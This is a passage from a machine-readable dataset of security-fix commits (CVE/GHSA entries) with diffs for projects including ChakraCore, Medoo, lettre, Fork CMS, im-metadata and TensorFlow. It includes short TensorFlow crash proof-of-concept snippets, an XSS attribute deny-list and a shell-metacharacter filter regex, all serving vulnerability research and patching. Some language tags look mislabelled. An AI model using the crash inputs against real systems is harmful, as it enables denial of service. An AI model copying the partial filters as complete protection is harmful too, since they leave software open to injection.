CVE-2019-1300.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/31f2588c7ba5b446bccf2769e9ecf4d444b73045","commit_sha":"31f2588c7ba5b446bccf2769e9ecf4d444b73045","patch":"MULTI","chain_ord":"['31f2588c7ba5b446bccf2769e9ecf4d444b73045', '7e9a2ee60baa95ceb4f48f522f823c812ca90c80']","before_first_fix_commit":"{'edf5eeef49168bbcc30dac82f57048ad46988295', 'c5297b86536fbf1a02d27cec28fea3c516e6ab84'}","last_fix_commit":"7e9a2ee60baa95ceb4f48f522f823c812ca90c80","chain_ord_pos":1.0,"commit_datetime":"07\/26\/2019, 22:39:34","message":"[CVE-2019-1237]","author":"Michael Holman","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'lib\/Runtime\/Library\/BoundFunction.cpp': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/31f2588c7ba5b446bccf2769e9ecf4d444b73045\/lib%2FRuntime%2FLibrary%2FBoundFunction.cpp', 'patch': \"@@ -354,6 +354,12 @@ namespace Js\\n             Var varLength;\\n             if (targetFunction->GetProperty(targetFunction, PropertyIds::length, &varLength, nullptr, requestContext))\\n             {\\n+                if (!TaggedInt::Is(varLength))\\n+                {\\n+                    \/\/ ToInt32 conversion on non-primitive length can invalidate assumptions made by the JIT,\\n+                    \/\/ so add implicit call flag if length isn't a TaggedInt already\\n+                    requestContext->GetThreadContext()->AddImplicitCallFlags(ImplicitCall_Accessor);\\n+                }\\n                 len = JavascriptConversion::ToInt32(varLength, requestContext);\\n             }\"}}","message_norm":"[cve-2019-1237]","language":"ro","entities":"[('cve-2019-1237', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Runtime\/Library\/BoundFunction.cpp'])","num_files":1.0},{"index":2729,"vuln_id":"GHSA-q9p4-qfc8-fvpp","cwe_id":"{'CWE-89'}","score":9.8,"chain":"{'https:\/\/github.com\/catfan\/Medoo\/commit\/659864b393961bf224bba1efc03b7dcbed7de533'}","dataset":"osv","summary":"SQL Injection in medoo columnQuote in medoo before 1.7.5 allows remote attackers to perform a SQL Injection due to improper escaping.","published_date":"2021-10-12","chain_len":1,"project":"https:\/\/github.com\/catfan\/Medoo","commit_href":"https:\/\/github.com\/catfan\/Medoo\/commit\/659864b393961bf224bba1efc03b7dcbed7de533","commit_sha":"659864b393961bf224bba1efc03b7dcbed7de533","patch":"SINGLE","chain_ord":"['659864b393961bf224bba1efc03b7dcbed7de533']","before_first_fix_commit":"{'b3f05edf256d63ec3cfd31d6a078c564daf9863d'}","last_fix_commit":"659864b393961bf224bba1efc03b7dcbed7de533","chain_ord_pos":1.0,"commit_datetime":"10\/11\/2019, 15:50:40","message":"[fix] Fix columnQuote for \bsecurity issue reported by Snyk","author":"Angel Lai","comments":"{'com_1': {'author': 'jfcherng', 'datetime': '10\/12\/2019, 11:57:36', 'body': \"It's perfect valid to use `_` in a column name and I believe it's used quite often. This change would make `v1.7.4` literally unusable for most of people.\\r\\n\\r\\nNot sure about other SQL standard. For MySQL, it's valid to use some of UTF-8 chars as the column name.\\r\\nhttps:\/\/dev.mysql.com\/doc\/refman\/8.0\/en\/identifiers.html\"}, 'com_2': {'author': 'catfan', 'datetime': '10\/12\/2019, 13:18:09', 'body': \"Thanks for this great spot. The `_` should be added. Although it's possible to use UTF-8 chars for column name, it may have some problem for some databases. Using `a-zA-Z0-9_` is enough for most case.\"}}","stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'src\/Medoo.php': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/catfan\/Medoo\/raw\/659864b393961bf224bba1efc03b7dcbed7de533\/src%2FMedoo.php', 'patch': '@@ -500,6 +500,11 @@ protected function typeMap($value, $type)\\n \\n \\tprotected function columnQuote($string)\\n \\t{\\n+\\t\\tif (!preg_match(\\'\/^[a-zA-Z0-9]+(\\\\.?[a-zA-Z0-9]+)?$\/i\\', $string))\\n+\\t\\t{\\n+\\t\\t\\tthrow new InvalidArgumentException(\"Incorrect column name \\\\\"$string\\\\\"\");\\n+\\t\\t}\\n+\\n \\t\\tif (strpos($string, \\'.\\') !== false)\\n \\t\\t{\\n \\t\\t\\treturn \\'\"\\' . $this->prefix . str_replace(\\'.\\', \\'\".\"\\', $string) . \\'\"\\';'}}","message_norm":"[fix] fix columnquote for \bsecurity issue reported by snyk","language":"en","entities":"[('fix', 'ACTION', ''), ('fix', 'ACTION', ''), ('\\x08security', 'SECWORD', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Medoo.php'])","num_files":1.0},{"index":2730,"vuln_id":"GHSA-q9qc-pp5x-mc8c","cwe_id":"{'CWE-94', 'CWE-1336'}","score":8.8,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/e0224462b3dd6b1f7c6ec1197413afc6019bc3b5'}","dataset":"osv","summary":"Improper Neutralization of Special Elements Used in a Template Engine in microweber Improper Neutralization of Special Elements Used in a Template Engine in GitHub repository microweber\/microweber prior to 1.3.","published_date":"2022-03-10","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/e0224462b3dd6b1f7c6ec1197413afc6019bc3b5","commit_sha":"e0224462b3dd6b1f7c6ec1197413afc6019bc3b5","patch":"SINGLE","chain_ord":"['e0224462b3dd6b1f7c6ec1197413afc6019bc3b5']","before_first_fix_commit":"{'b2baab6e582b2efe63788d367a2bb61a2fa26470'}","last_fix_commit":"e0224462b3dd6b1f7c6ec1197413afc6019bc3b5","chain_ord_pos":1.0,"commit_datetime":"03\/09\/2022, 11:17:21","message":"Update AdminCommentController.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 3, 'deletions': 10, 'total': 13}","files":"{'src\/MicroweberPackages\/Comment\/Http\/Controllers\/Admin\/AdminCommentController.php': {'additions': 3, 'deletions': 10, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/e0224462b3dd6b1f7c6ec1197413afc6019bc3b5\/src%2FMicroweberPackages%2FComment%2FHttp%2FControllers%2FAdmin%2FAdminCommentController.php', 'patch': \"@@ -18,18 +18,16 @@\\n use MicroweberPackages\\\\Comment\\\\Models\\\\Comment;\\n use MicroweberPackages\\\\Comment\\\\Events\\\\NewComment;\\n use MicroweberPackages\\\\Comment\\\\Notifications\\\\NewCommentNotification;\\n+use MicroweberPackages\\\\Helper\\\\HTMLClean;\\n use MicroweberPackages\\\\User\\\\Models\\\\User;\\n use MicroweberPackages\\\\Utils\\\\Mail\\\\MailSender;\\n \\n-\\n class AdminCommentController extends AdminController\\n {\\n     public function index(Request $request)\\n     {\\n-\\n         $contents = $this->getComments($request);\\n \\n-\\n         return $this->view('comment::admin.comments.index', ['contents' => $contents]);\\n     }\\n \\n@@ -42,7 +40,6 @@ public function getComments(Request $request)\\n             $contents = $contents->filter($filter);\\n         }\\n \\n-\\n         $contents = $contents->paginate($request->get('limit', 30))\\n             ->appends($request->except('page'));\\n \\n@@ -148,12 +145,8 @@ public function saveCommentEdit(Request $request)\\n \\n         $comment_body = $data['comment_body'];\\n \\n-        \/\/ Claer HTML\\n-        $comment_body = $this->app->format->clean_html($comment_body);\\n-\\n-        \/\/ Clear XSS\\n-        $evil = ['(?<!\\\\w)on\\\\w*', 'xmlns', 'formaction', 'xlink:href', 'FSCommand', 'seekSegmentTime'];\\n-        $comment_body = $this->app->format->clean_xss($comment_body, true, $evil, 'removeEvilAttributes');\\n+        $cleanHtml = new HTMLClean();\\n+        $comment_body = $cleanHtml->onlyTags($comment_body);\\n \\n         if (!empty($comment_body) and !empty($data['format']) and $data['format'] == 'markdown') {\\n             $comment_body = Markdown::convertToHtml($comment_body);\"}}","message_norm":"update admincommentcontroller.php","language":"fr","entities":"[('update', 'ACTION', ''), ('admincommentcontroller.php', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Comment\/Http\/Controllers\/Admin\/AdminCommentController.php'])","num_files":1.0},{"index":2733,"vuln_id":"GHSA-qc36-q22q-cjw3","cwe_id":"{'CWE-147'}","score":9.8,"chain":"{'https:\/\/github.com\/lettre\/lettre\/pull\/627\/commits\/93458d01fed0ec81c0e7b4e98e6f35961356fae2', 'https:\/\/github.com\/lettre\/lettre\/commit\/8bfc20506cc5e098fe6eb3d1cafe3bea791215ce'}","dataset":"osv","summary":"SMTP command injection in lettre ### Impact\n\nAffected versions of lettre allowed SMTP command injection through an attacker's controlled message body. The module for escaping lines starting with a period wouldn't catch a period that was placed after a double CRLF sequence, allowing the attacker to end the current message and write arbitrary SMTP commands after it.\n\n### Fix\n\nThe flaw is fixed by correctly handling consecutive CRLF sequences.\n\n### References\n\n* [RUSTSEC-2021-0069](https:\/\/rustsec.org\/advisories\/RUSTSEC-2021-0069.html)","published_date":"2021-07-12","chain_len":2,"project":"https:\/\/github.com\/lettre\/lettre","commit_href":"https:\/\/github.com\/lettre\/lettre\/pull\/627\/commits\/93458d01fed0ec81c0e7b4e98e6f35961356fae2","commit_sha":"93458d01fed0ec81c0e7b4e98e6f35961356fae2","patch":"MULTI","chain_ord":"['93458d01fed0ec81c0e7b4e98e6f35961356fae2', '8bfc20506cc5e098fe6eb3d1cafe3bea791215ce']","before_first_fix_commit":"{'d930c42d5069e344a9dfa84ebe4b60bf3b11ac64'}","last_fix_commit":"8bfc20506cc5e098fe6eb3d1cafe3bea791215ce","chain_ord_pos":1.0,"commit_datetime":"05\/22\/2021, 17:31:36","message":"fix(transport-smtp): Fix transparency codec\n\nIt fails to add transparency when a period is preceded by two\nsuccessive CRLF.","author":"Paolo Barbolini","comments":null,"stats":"{'additions': 11, 'deletions': 2, 'total': 13}","files":"{'src\/transport\/smtp\/client\/mod.rs': {'additions': 11, 'deletions': 2, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/lettre\/lettre\/raw\/93458d01fed0ec81c0e7b4e98e6f35961356fae2\/src%2Ftransport%2Fsmtp%2Fclient%2Fmod.rs', 'patch': '@@ -78,7 +78,15 @@ impl ClientCodec {\\n                     match self.escape_count {\\n                         0 => self.escape_count = if *byte == b\\'\\\\r\\' { 1 } else { 0 },\\n                         1 => self.escape_count = if *byte == b\\'\\\\n\\' { 2 } else { 0 },\\n-                        2 => self.escape_count = if *byte == b\\'.\\' { 3 } else { 0 },\\n+                        2 => {\\n+                            self.escape_count = if *byte == b\\'.\\' {\\n+                                3\\n+                            } else if *byte == b\\'\\\\r\\' {\\n+                                1\\n+                            } else {\\n+                                0\\n+                            }\\n+                        }\\n                         _ => unreachable!(),\\n                     }\\n                     if self.escape_count == 3 {\\n@@ -111,6 +119,7 @@ mod test {\\n         let mut buf: Vec<u8> = vec![];\\n \\n         codec.encode(b\"test\\\\r\\\\n\", &mut buf);\\n+        codec.encode(b\"test\\\\r\\\\n\\\\r\\\\n\", &mut buf);\\n         codec.encode(b\".\\\\r\\\\n\", &mut buf);\\n         codec.encode(b\"\\\\r\\\\ntest\", &mut buf);\\n         codec.encode(b\"te\\\\r\\\\n.\\\\r\\\\nst\", &mut buf);\\n@@ -121,7 +130,7 @@ mod test {\\n         codec.encode(b\"test\", &mut buf);\\n         assert_eq!(\\n             String::from_utf8(buf).unwrap(),\\n-            \"test\\\\r\\\\n..\\\\r\\\\n\\\\r\\\\ntestte\\\\r\\\\n..\\\\r\\\\nsttesttest.test\\\\n.test\\\\ntest\"\\n+            \"test\\\\r\\\\ntest\\\\r\\\\n\\\\r\\\\n..\\\\r\\\\n\\\\r\\\\ntestte\\\\r\\\\n..\\\\r\\\\nsttesttest.test\\\\n.test\\\\ntest\"\\n         );\\n     }'}}","message_norm":"fix(transport-smtp): fix transparency codec\n\nit fails to add transparency when a period is preceded by two\nsuccessive crlf.","language":"en","entities":"[('fix(transport', 'ACTION', ''), ('fix', 'ACTION', ''), ('add', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/transport\/smtp\/client\/mod.rs'])","num_files":1.0},{"index":2734,"vuln_id":"GHSA-qc36-q22q-cjw3","cwe_id":"{'CWE-147'}","score":9.8,"chain":"{'https:\/\/github.com\/lettre\/lettre\/pull\/627\/commits\/93458d01fed0ec81c0e7b4e98e6f35961356fae2', 'https:\/\/github.com\/lettre\/lettre\/commit\/8bfc20506cc5e098fe6eb3d1cafe3bea791215ce'}","dataset":"osv","summary":"SMTP command injection in lettre ### Impact\n\nAffected versions of lettre allowed SMTP command injection through an attacker's controlled message body. The module for escaping lines starting with a period wouldn't catch a period that was placed after a double CRLF sequence, allowing the attacker to end the current message and write arbitrary SMTP commands after it.\n\n### Fix\n\nThe flaw is fixed by correctly handling consecutive CRLF sequences.\n\n### References\n\n* [RUSTSEC-2021-0069](https:\/\/rustsec.org\/advisories\/RUSTSEC-2021-0069.html)","published_date":"2021-07-12","chain_len":2,"project":"https:\/\/github.com\/lettre\/lettre","commit_href":"https:\/\/github.com\/lettre\/lettre\/commit\/8bfc20506cc5e098fe6eb3d1cafe3bea791215ce","commit_sha":"8bfc20506cc5e098fe6eb3d1cafe3bea791215ce","patch":"MULTI","chain_ord":"['93458d01fed0ec81c0e7b4e98e6f35961356fae2', '8bfc20506cc5e098fe6eb3d1cafe3bea791215ce']","before_first_fix_commit":"{'d930c42d5069e344a9dfa84ebe4b60bf3b11ac64'}","last_fix_commit":"8bfc20506cc5e098fe6eb3d1cafe3bea791215ce","chain_ord_pos":2.0,"commit_datetime":"05\/22\/2021, 17:58:27","message":"fix(transport-smtp): Fix transparency codec - 0.9.x (#628)\n\nCo-authored-by: Paolo Barbolini <paolo@paolo565.org>","author":"Alexis Mousset","comments":null,"stats":"{'additions': 11, 'deletions': 2, 'total': 13}","files":"{'lettre\/src\/smtp\/client\/mod.rs': {'additions': 11, 'deletions': 2, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/lettre\/lettre\/raw\/8bfc20506cc5e098fe6eb3d1cafe3bea791215ce\/lettre%2Fsrc%2Fsmtp%2Fclient%2Fmod.rs', 'patch': '@@ -51,7 +51,15 @@ impl ClientCodec {\\n                     match self.escape_count {\\n                         0 => self.escape_count = if *byte == b\\'\\\\r\\' { 1 } else { 0 },\\n                         1 => self.escape_count = if *byte == b\\'\\\\n\\' { 2 } else { 0 },\\n-                        2 => self.escape_count = if *byte == b\\'.\\' { 3 } else { 0 },\\n+                        2 => {\\n+                            self.escape_count = if *byte == b\\'.\\' {\\n+                                3\\n+                            } else if *byte == b\\'\\\\r\\' {\\n+                                1\\n+                            } else {\\n+                                0\\n+                            }\\n+                        }\\n                         _ => unreachable!(),\\n                     }\\n                     if self.escape_count == 3 {\\n@@ -286,6 +294,7 @@ mod test {\\n         let mut buf: Vec<u8> = vec![];\\n \\n         assert!(codec.encode(b\"test\\\\r\\\\n\", &mut buf).is_ok());\\n+        assert!(codec.encode(b\"test\\\\r\\\\n\\\\r\\\\n\", &mut buf).is_ok());\\n         assert!(codec.encode(b\".\\\\r\\\\n\", &mut buf).is_ok());\\n         assert!(codec.encode(b\"\\\\r\\\\ntest\", &mut buf).is_ok());\\n         assert!(codec.encode(b\"te\\\\r\\\\n.\\\\r\\\\nst\", &mut buf).is_ok());\\n@@ -296,7 +305,7 @@ mod test {\\n         assert!(codec.encode(b\"test\", &mut buf).is_ok());\\n         assert_eq!(\\n             String::from_utf8(buf).unwrap(),\\n-            \"test\\\\r\\\\n..\\\\r\\\\n\\\\r\\\\ntestte\\\\r\\\\n..\\\\r\\\\nsttesttest.test\\\\n.test\\\\ntest\"\\n+            \"test\\\\r\\\\ntest\\\\r\\\\n\\\\r\\\\n..\\\\r\\\\n\\\\r\\\\ntestte\\\\r\\\\n..\\\\r\\\\nsttesttest.test\\\\n.test\\\\ntest\"\\n         );\\n     }'}}","message_norm":"fix(transport-smtp): fix transparency codec - 0.9.x (#628)\n\nco-authored-by: paolo barbolini <paolo@paolo565.org>","language":"en","entities":"[('fix(transport', 'ACTION', ''), ('fix', 'ACTION', ''), ('#628', 'ISSUE', ''), ('paolo@paolo565.org', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lettre\/src\/smtp\/client\/mod.rs'])","num_files":1.0},{"index":2740,"vuln_id":"GHSA-qf2g-q4mc-w7rr","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/forkcms\/forkcms\/commit\/981730f1a3d59b423ca903b1f4bf79b848a1766e'}","dataset":"osv","summary":"Cross-site Scripting in Fork CMS Fork CMS prior to 5.11.1 is vulnerable to stored cross-site scripting. When uploading a new module, the description of the module can contain JavaScript code. The JavaScript code may be executed after uploading the new module and looking at the `Details` page.","published_date":"2022-03-25","chain_len":1,"project":"https:\/\/github.com\/forkcms\/forkcms","commit_href":"https:\/\/github.com\/forkcms\/forkcms\/commit\/981730f1a3d59b423ca903b1f4bf79b848a1766e","commit_sha":"981730f1a3d59b423ca903b1f4bf79b848a1766e","patch":"SINGLE","chain_ord":"['981730f1a3d59b423ca903b1f4bf79b848a1766e']","before_first_fix_commit":"{'1b38e33a98992793e998a937b717355212346993'}","last_fix_commit":"981730f1a3d59b423ca903b1f4bf79b848a1766e","chain_ord_pos":1.0,"commit_datetime":"03\/23\/2022, 13:20:39","message":"Fix xss though the description in the info.xml file of a theme or module","author":"Jelmer Prins","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/Backend\/Modules\/Extensions\/Engine\/Model.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/forkcms\/forkcms\/raw\/981730f1a3d59b423ca903b1f4bf79b848a1766e\/src%2FBackend%2FModules%2FExtensions%2FEngine%2FModel.php', 'patch': \"@@ -839,7 +839,7 @@ public static function processModuleXml(\\\\SimpleXMLElement $xml): array\\n         $information['name'] = (string) $module->name;\\n         $information['version'] = (string) $module->version;\\n         $information['requirements'] = (array) $module->requirements;\\n-        $information['description'] = (string) $module->description;\\n+        $information['description'] = strip_tags((string) $module->description, '<h1><h2><h3><h4><h5><h6><p><li><a>');\\n         $information['cronjobs'] = [];\\n \\n         \/\/ authors\\n@@ -900,7 +900,7 @@ public static function processThemeXml(\\\\SimpleXMLElement $xml): array\\n         $information['version'] = (string) $theme->version;\\n         $information['requirements'] = (array) $theme->requirements;\\n         $information['thumbnail'] = (string) $theme->thumbnail;\\n-        $information['description'] = (string) $theme->description;\\n+        $information['description'] = strip_tags((string) $theme->description, '<h1><h2><h3><h4><h5><h6><p><li><a>');\\n \\n         \/\/ authors\\n         foreach ($xml->xpath('\/theme\/authors\/author') as $author) {\"}}","message_norm":"fix xss though the description in the info.xml file of a theme or module","language":"en","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Backend\/Modules\/Extensions\/Engine\/Model.php'])","num_files":1.0},{"index":2746,"vuln_id":"GHSA-qfpc-5pjr-mh26","cwe_id":"{'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/da857cfa0fde8f79ad0afdbc94e88b5d4bbec764'}","dataset":"osv","summary":"Missing validation in shape inference for `Dequantize` ### Impact\nThe shape inference code for `tf.raw_ops.Dequantize` has a vulnerability that could trigger a denial of service via a segfault if an attacker provides invalid arguments:\n\n```python\nimport tensorflow as tf\n\ntf.compat.v1.disable_v2_behavior()\ntf.raw_ops.Dequantize(\n  input_tensor = tf.constant(-10.0, dtype=tf.float32),\n  input_tensor = tf.cast(input_tensor, dtype=tf.quint8),\n  min_range = tf.constant([], shape=[0], dtype=tf.float32),\n  max_range = tf.constant([], shape=[0], dtype=tf.float32),\n  mode  = 'MIN_COMBINED',\n  narrow_range=False,\n  axis=-10,\n  dtype=tf.dtypes.float32)\n```\n\nThe shape inference [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/ops\/array_ops.cc#L2999-L3014) uses `axis` to select between two different values for `minmax_rank` which is then used to retrieve tensor dimensions. However, code assumes that `axis` can be either `-1` or a value greater than `-1`, with no validation for the other values.\n\n### Patches\nWe have patched the issue in GitHub commit [da857cfa0fde8f79ad0afdbc94e88b5d4bbec764](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/da857cfa0fde8f79ad0afdbc94e88b5d4bbec764).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/da857cfa0fde8f79ad0afdbc94e88b5d4bbec764","commit_sha":"da857cfa0fde8f79ad0afdbc94e88b5d4bbec764","patch":"SINGLE","chain_ord":"['da857cfa0fde8f79ad0afdbc94e88b5d4bbec764']","before_first_fix_commit":"{'8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4'}","last_fix_commit":"da857cfa0fde8f79ad0afdbc94e88b5d4bbec764","chain_ord_pos":1.0,"commit_datetime":"07\/30\/2021, 01:24:18","message":"Fix a shape inference issue leading to nullptr deref.\n\nPiperOrigin-RevId: 387712259\nChange-Id: I7e670772b259c068a501a187cd89f18773bb95a1","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/ops\/array_ops.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/da857cfa0fde8f79ad0afdbc94e88b5d4bbec764\/tensorflow%2Fcore%2Fops%2Farray_ops.cc', 'patch': '@@ -2990,6 +2990,10 @@ REGISTER_OP(\"Dequantize\")\\n       if (!s.ok() && s.code() != error::NOT_FOUND) {\\n         return s;\\n       }\\n+      if (axis < -1) {\\n+        return errors::InvalidArgument(\"axis should be at least -1, got \",\\n+                                       axis);\\n+      }\\n       const int minmax_rank = (axis == -1) ? 0 : 1;\\n       TF_RETURN_IF_ERROR(shape_inference::UnchangedShape(c));\\n       ShapeHandle minmax;'}}","message_norm":"fix a shape inference issue leading to nullptr deref.\n\npiperorigin-revid: 387712259\nchange-id: i7e670772b259c068a501a187cd89f18773bb95a1","language":"en","entities":"[('fix', 'ACTION', ''), ('issue', 'FLAW', ''), ('nullptr', 'SECWORD', ''), ('387712259', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/ops\/array_ops.cc'])","num_files":1.0},{"index":2747,"vuln_id":"GHSA-qfxv-qqvg-24pg","cwe_id":"{'CWE-78'}","score":9.8,"chain":"{'https:\/\/github.com\/Turistforeningen\/node-im-metadata\/commit\/ea15dddbe0f65694bfde36b78dd488e90f246639'}","dataset":"osv","summary":"OS Command Injection in im-metadata im-metadata through 3.0.1 allows remote attackers to execute arbitrary commands via the \"exec\" argument. It is possible to inject arbitrary commands as part of the metadata options which is given to the \"exec\" function.","published_date":"2021-04-13","chain_len":1,"project":"https:\/\/github.com\/Turistforeningen\/node-im-metadata","commit_href":"https:\/\/github.com\/Turistforeningen\/node-im-metadata\/commit\/ea15dddbe0f65694bfde36b78dd488e90f246639","commit_sha":"ea15dddbe0f65694bfde36b78dd488e90f246639","patch":"SINGLE","chain_ord":"['ea15dddbe0f65694bfde36b78dd488e90f246639']","before_first_fix_commit":"{'049ce24dbb4302811b9247444347da6561605a8a'}","last_fix_commit":"ea15dddbe0f65694bfde36b78dd488e90f246639","chain_ord_pos":1.0,"commit_datetime":"02\/03\/2020, 21:26:09","message":"fix: check path argument before processing (#10)\n\nhotfix to re mediate command injection","author":"Sam Sanoop","comments":null,"stats":"{'additions': 9, 'deletions': 6, 'total': 15}","files":"{'index.js': {'additions': 9, 'deletions': 6, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Turistforeningen\/node-im-metadata\/raw\/ea15dddbe0f65694bfde36b78dd488e90f246639\/index.js', 'patch': \"@@ -9,15 +9,18 @@ module.exports = function(path, opts, cb) {\\n     opts = {};\\n   }\\n \\n-  var cmd = module.exports.cmd(path, opts);\\n-  opts.timeout = opts.timeout || 5000;\\n-\\n-  exec(cmd, opts, function(e, stdout, stderr) {\\n-    if (e) { return cb(e); }\\n+  if(\/;|&|`|\\\\$|\\\\(|\\\\)|\\\\|\\\\||\\\\||!|>|<|\\\\?|\\\\${\/g.test(JSON.stringify(path))) {\\n+    console.log('Input Validation failed, Suspicious Characters found');\\n+  } else {\\n+    var cmd = module.exports.cmd(path, opts);\\n+    opts.timeout = opts.timeout || 5000;\\n+    exec(cmd, opts, function(e, stdout, stderr) {\\n+      if (e) { return cb(e); }\\n     if (stderr) { return cb(new Error(stderr)); }\\n \\n-    return cb(null, module.exports.parse(path, stdout, opts));\\n+      return cb(null, module.exports.parse(path, stdout, opts));\\n   });\\n+}\\n };\\n \\n module.exports.cmd = function(path, opts) {\"}}","message_norm":"fix: check path argument before processing (#10)\n\nhotfix to re mediate command injection","language":"en","entities":"[('#10', 'ISSUE', ''), ('hotfix', 'ACTION', ''), ('command injection', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":2748,"vuln_id":"GHSA-qg48-85hg-mqc5","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/da5ff2daf618591f64b2b62d9d9803951b945e9f'}","dataset":"osv","summary":"Division by 0 in `DenseCountSparseOutput` ### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.DenseCountSparseOutput`:\n\n```python\nimport tensorflow as tf\n\nvalues = tf.constant([], shape=[0, 0], dtype=tf.int64)\nweights = tf.constant([])\n\ntf.raw_ops.DenseCountSparseOutput(\n  values=values, weights=weights,\n  minlength=-1, maxlength=58, binary_output=True)\n```\n  \nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/efff014f3b2d8ef6141da30c806faf141297eca1\/tensorflow\/core\/kernels\/count_ops.cc#L123-L127) computes a divisor value from user data but does not check that the result is 0 before doing the division:\n\n```cc\nint num_batch_elements = 1;\nfor (int i = 0; i < num_batch_dimensions; ++i) {\n  num_batch_elements *= data.shape().dim_size(i);\n}\nint num_value_elements = data.shape().num_elements() \/ num_batch_elements;\n```\n\nSince `data` is given by the `values` argument, `num_batch_elements` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [da5ff2daf618591f64b2b62d9d9803951b945e9f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/da5ff2daf618591f64b2b62d9d9803951b945e9f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, and TensorFlow 2.3.3, as these are also affected.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/da5ff2daf618591f64b2b62d9d9803951b945e9f","commit_sha":"da5ff2daf618591f64b2b62d9d9803951b945e9f","patch":"SINGLE","chain_ord":"['da5ff2daf618591f64b2b62d9d9803951b945e9f']","before_first_fix_commit":"{'efff014f3b2d8ef6141da30c806faf141297eca1'}","last_fix_commit":"da5ff2daf618591f64b2b62d9d9803951b945e9f","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 18:24:45","message":"Fix FPE issue with `tf.raw_ops.DenseCountSparseOutput`.\n\nPiperOrigin-RevId: 370946862\nChange-Id: I3752584ad04aaecb327ff6793a9640ac56acfe7a","author":"Amit Patankar","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/count_ops.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/da5ff2daf618591f64b2b62d9d9803951b945e9f\/tensorflow%2Fcore%2Fkernels%2Fcount_ops.cc', 'patch': '@@ -122,6 +122,9 @@ class DenseCount : public OpKernel {\\n \\n     int num_batch_elements = 1;\\n     for (int i = 0; i < num_batch_dimensions; ++i) {\\n+      OP_REQUIRES(context, data.shape().dim_size(i) != 0,\\n+                  errors::InvalidArgument(\\n+                      \"Invalid input: Shapes dimension cannot be 0.\"));\\n       num_batch_elements *= data.shape().dim_size(i);\\n     }\\n     int num_value_elements = data.shape().num_elements() \/ num_batch_elements;'}}","message_norm":"fix fpe issue with `tf.raw_ops.densecountsparseoutput`.\n\npiperorigin-revid: 370946862\nchange-id: i3752584ad04aaecb327ff6793a9640ac56acfe7a","language":"en","entities":"[('fix', 'ACTION', ''), ('fpe', 'SECWORD', ''), ('issue', 'FLAW', ''), ('370946862', 'SHA', 